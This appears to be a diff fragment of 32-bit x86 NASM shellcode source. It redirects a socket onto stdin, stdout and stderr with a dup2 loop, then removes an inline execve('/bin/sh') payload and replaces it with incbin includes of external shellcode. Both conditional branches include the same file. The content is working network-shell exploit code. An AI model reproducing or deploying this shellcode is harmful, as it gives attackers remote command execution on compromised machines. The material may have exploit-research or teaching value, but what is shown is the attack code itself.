@@ -9,8 +9,10 @@
 BITS 32
 global main
 
-	section .mytext progbits alloc exec write
-
+%ifdef ELF
+	section .mytext progbits alloc  write
+%endif
+	
 main:
 	mov ecx,esp 		; TODO is this too early?
 	xor cx,cx 		; ecx=some valid stack address
@@ -51,18 +53,13 @@ mydup2:
 	dec ecx    	; this is for looping stderr/out/in
 	jns mydup2.copy
 
-	
 
-	;; OUR SOCKET IS IN EBX
-	
-	;; now just some local shellcode
-	;; execve("/bin/sh", NULL, NULL) 
-	xor eax,eax 		; set up null byte
-	push eax  		; push null byte to terminate /bin/sh 
-	push 0x68732f2f         ; /bin//sh is too wide for register
-	push 0x6e69622f 	; use 2 pushes to the stack
-	mov al,execve 		;execve in /usr/include/asm/unistd_32.h
-	mov ebx,esp 		;arg1 = "/bin/sh\0" 
-	xor ecx,ecx 		;arg2 = \0
-	xor edx,edx 		;arg3 = \0
-	int 0x80
+	;; local shellcode
+
+%ifdef 	EMULATOR
+	;; shell emulating shellcode
+	incbin "../32shellEmulator/shellcode"
+%else
+	;; ordinary shellcode (/bin/sh)
+	incbin "../32shellEmulator/shellcode"
+%endif
